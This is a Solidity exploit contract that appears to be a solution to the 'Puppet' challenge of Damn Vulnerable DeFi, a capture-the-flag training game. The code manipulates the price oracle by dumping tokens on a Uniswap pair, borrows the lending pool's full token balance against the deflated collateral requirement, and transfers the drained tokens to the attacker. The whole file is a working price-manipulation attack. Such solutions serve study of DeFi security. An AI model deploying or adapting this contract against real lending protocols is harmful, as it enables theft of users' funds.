// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

interface IPuppetPool {
    function borrow(uint256 amount) external payable;

    function computeOraclePrice() external view returns (uint256);

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetAttack {
    IERC20 token;
    IUniswapExchange uniswap;
    IPuppetPool pool;

    constructor(
        IERC20 _token,
        IUniswapExchange _uniswap,
        IPuppetPool _pool
    ) payable {
        token = _token;
        uniswap = _uniswap;
        pool = _pool;
    }

    function execute(uint256 amount) external payable {
        require(
            token.balanceOf(address(this)) >= amount,
            "not enough tokens in contract"
        );

        token.approve(address(address(uniswap)), amount);
        // Dump tokens on AMM to unbalance ETH/Token pair
        uniswap.tokenToEthSwapInput(amount - 1, 1, block.timestamp + 1);

        // Determine required collateral to drain tokens in lending pool
        uint256 collateral = pool.calculateDepositRequired(
            token.balanceOf(address(pool))
        );

        // Determine pool token balance and borow using collateral
        uint256 poolTokenBalance = token.balanceOf(address(pool));
        pool.borrow{value: collateral}(poolTokenBalance);

        // Send tokens back to attacker
        token.transfer(msg.sender, poolTokenBalance);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
